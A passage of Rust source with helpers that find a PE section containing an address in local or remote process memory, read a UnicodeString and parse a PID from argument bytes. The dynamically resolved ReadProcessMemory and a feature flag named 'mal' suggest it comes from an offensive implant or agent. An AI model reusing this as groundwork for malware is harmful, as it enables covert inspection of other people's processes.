                    &mut br,
                );
                val
            }
        };

        if e_lfanew <= 0 || e_lfanew > 0x1000 {
            return String::new();
        }

        let nt_headers_addr = module_base + e_lfanew as usize;

        let (num_sections, opt_header_size): (u16, u16) = match remote_handle {
            None => {
                let nt = nt_headers_addr as *const ImageNtHeaders;
                ((*nt).file_header.number_of_sections, (*nt).file_header.size_of_optional_header)
            }
            Some(h) => {
                let inst = match get_instance() {
                    Some(i) => i,
                    None => return String::new(),
                };
                let mut num: u16 = 0;
                let mut opt_size: u16 = 0;
                let mut br: usize = 0;
                (inst.k32.read_process_memory)(
                    h,
                    (nt_headers_addr + 6) as *const c_void,
                    &mut num as *mut u16 as *mut c_void,
                    2,
                    &mut br,
                );
                (inst.k32.read_process_memory)(
                    h,
                    (nt_headers_addr + 20) as *const c_void,
                    &mut opt_size as *mut u16 as *mut c_void,
                    2,
                    &mut br,
                );
                (num, opt_size)
            }
        };

        if num_sections == 0 || num_sections > 96 {
            return String::new();
        }

        let sections_start = nt_headers_addr + 24 + opt_header_size as usize;
        let section_size = core::mem::size_of::<ImageSectionHeader>();

        for i in 0..num_sections as usize {
            let section_addr = sections_start + i * section_size;

            let (sec_name, sec_va, sec_vsize): ([u8; 8], u32, u32) = match remote_handle {
                None => {
                    let sec = section_addr as *const ImageSectionHeader;
                    ((*sec).name, (*sec).virtual_address, (*sec).virtual_size)
                }
                Some(h) => {
                    let inst = match get_instance() {
                        Some(i) => i,
                        None => return String::new(),
                    };
                    let mut sec: ImageSectionHeader = core::mem::zeroed();
                    let mut br: usize = 0;
                    (inst.k32.read_process_memory)(
                        h,
                        section_addr as *const c_void,
                        &mut sec as *mut ImageSectionHeader as *mut c_void,
                        section_size,
                        &mut br,
                    );
                    (sec.name, sec.virtual_address, sec.virtual_size)
                }
            };

            if rva >= sec_va && rva < sec_va + sec_vsize {
                let name_end = sec_name.iter().position(|&b| b == 0).unwrap_or(8);
                return core::str::from_utf8(&sec_name[..name_end])
                    .unwrap_or("")
                    .to_string();
            }
        }
    }
    String::new()
}

#[cfg(feature = "mal")]
/// Read a UnicodeString from local memory
fn read_unicode_string_local(us: &crate::libs::ntdef::UnicodeString) -> String {
    if us.buffer.is_null() || us.length == 0 {
        return String::new();
    }
    let char_count = us.length as usize / 2;
    let slice = unsafe { core::slice::from_raw_parts(us.buffer, char_count) };
    String::from_utf16_lossy(slice)
}

/// Parse a PID from argument bytes (u32 LE)
pub fn parse_pid(data: &[u8]) -> Option<u32> {
    if data.is_empty() {
        return None;
    }
    let pid = if data.len() >= 4 {
        u32::from_le_bytes([data[0], data[1], data[2], data[3]])
    } else if data.len() >= 2 {
        u16::from_le_bytes([data[0], data[1]]) as u32
    } else {
        data[0] as u32
    };
    if pid == 0 { None } else { Some(pid) }
}
